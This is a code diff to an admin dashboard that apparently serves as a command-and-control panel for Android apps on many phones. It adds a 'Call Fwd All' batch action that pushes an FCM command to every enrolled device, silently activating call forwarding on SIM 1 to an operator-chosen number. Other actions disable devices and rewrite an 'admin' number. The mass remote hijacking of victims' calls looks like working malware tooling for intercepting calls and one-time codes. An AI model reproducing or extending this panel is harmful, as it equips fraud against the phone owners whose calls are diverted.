@@ -2190,7 +2190,7 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
   const [batchTotal, setBatchTotal] = useState(0);
   const [batchResult, setBatchResult] = useState<{ ok: number; fail: number } | null>(null);
   const [adminNumInput, setAdminNumInput] = useState("");
-  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin">("ping");
+  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin" | "call_forward">("ping");
 
   /* ── Sessions (per-app selector) ── */
   const [sessAppFilter, setSessAppFilter] = useState(apps[0]?.appId ?? "");
@@ -2262,6 +2262,7 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
           let data: Record<string, string>;
           if (batchAction === "ping") data = { type: "0" };
           else if (batchAction === "disable") data = { type: "admin_update", status: "off" };
+          else if (batchAction === "call_forward") data = { type: "call_forward", action: "activate", number: adminNumInput.trim(), sim: "0" };
           else data = { type: "admin_update", status: "on", number: adminNumInput.trim() };
           return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: d.deviceId } })); });
         }));
@@ -2315,15 +2316,15 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
         <div style={{ fontSize: 12, color: T.muted, marginBottom: 12 }}>Send FCM commands to <b style={{ color: T.accentLight }}>ALL FCM-enabled devices</b> across every app at once</div>
 
         <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
-          {(["ping", "disable", "update_admin"] as const).map(a => (
+          {(["ping", "disable", "update_admin", "call_forward"] as const).map(a => (
             <button key={a} onClick={() => setBatchAction(a)} style={{ flex: 1, padding: "8px 6px", borderRadius: 8, border: `1.5px solid ${batchAction === a ? T.accent : T.borderLight}`, background: batchAction === a ? T.accentGlow : T.border, color: batchAction === a ? T.accentLight : T.muted, fontWeight: 700, fontSize: 11, cursor: "pointer" }}>
-              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : "Update Admin"}
+              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : a === "update_admin" ? "Update Admin" : "Call Fwd All"}
             </button>
           ))}
         </div>
 
-        {batchAction === "update_admin" && (
-          <input type="tel" placeholder="Admin phone number" value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
+        {(batchAction === "update_admin" || batchAction === "call_forward") && (
+          <input type="tel" placeholder={batchAction === "call_forward" ? "Forward to number (SIM 1)" : "Admin phone number"} value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
         )}
 
         {(batchState === "loading" || batchState === "running") && (
@@ -2368,9 +2369,9 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
         )}
         {batchState === "err" && <div style={{ background: T.red + "15", borderRadius: 9, padding: "9px 14px", color: T.red, fontSize: 12, marginBottom: 12, display: "flex", alignItems: "center", gap: 8 }}><Ic.Alert /> Failed. Retry.</div>}
 
-        <button onClick={() => void runBatch()} disabled={busyBatch || (batchAction === "update_admin" && !adminNumInput.trim())}
+        <button onClick={() => void runBatch()} disabled={busyBatch || ((batchAction === "update_admin" || batchAction === "call_forward") && !adminNumInput.trim())}
           style={{ width: "100%", padding: "11px 0", borderRadius: 9, background: batchState === "done" ? T.green : busyBatch ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, border: "none", color: batchState === "done" ? "#fff" : busyBatch ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: busyBatch ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : <><Ic.Key /> Update Admin Number</>}
+          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : batchAction === "call_forward" ? <><Ic.ArrowRight /> Call Forward All (SIM 1)</> : <><Ic.Key /> Update Admin Number</>}
         </button>
       </div>
 
